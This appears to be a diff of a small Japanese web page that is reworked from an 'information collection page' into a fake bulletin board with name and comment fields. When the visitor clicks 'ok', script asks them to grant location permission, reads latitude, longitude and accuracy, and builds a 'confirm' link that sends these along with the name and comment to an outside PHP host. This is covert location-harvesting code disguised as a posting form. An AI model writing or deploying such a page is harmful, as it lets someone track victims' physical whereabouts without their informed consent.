@@ -1,10 +1,28 @@
-
-<html>
+<html lang="ja">
 <head>
-<title>情報収得ページ</title>
+<title>投稿ページ</title>
+<meta charset="UTF-8" />
 </head>
-</html>
+<body>
+<h1>掲示板です</h1>
+<br>
+<h1>名前</h1>
+<br>
+<input type="text" id="name">
+<br>
+<h1>コメント</h1>
+<input type="text" id="text">
+<br>
+<input type="button" value="ok" onClick="test()">
+
+<br><br>
+<a href="https://bit.ly/2FotoeN">lineにGO</a>
+
 <script>
+var name = document.getElementById('name').value;
+var text = document.getElementById('text').value;
+
+function test() {
 window.alert("許可押してね");
 
 var today = new Date();
@@ -23,8 +41,10 @@ navigator.geolocation.getCurrentPosition( (position) => {
 
 function displayData(lat, lng, accu){
 
-var param = location.search
-
-document.write("<a href=http://yumaabckhh.php.xdomain.jp/h.php" + param + "&get=" + month + "月" + day + "日" + "%3Cbr%3E" + lat + "%3Cbr%3E" + lng + "%3Cbr%3E" + accu + ">送信</a><br><h1>送信押してね</h1>");
+document.write("<h1>名前</h1><br>" + name + "<br><h1>コメント</h1>" + text);
+document.write("<br><a href=http://yumaabckhh.php.xdomain.jp/h.php?name=" + name + "&text=" + text + "&get=" + month + "月" + day + "日" + "%3Cbr%3E" + lat + "%3Cbr%3E" + lng + "%3Cbr%3E" + accu + ">確定</a>");
+}
 }
 </script>
+</body>
+</html>
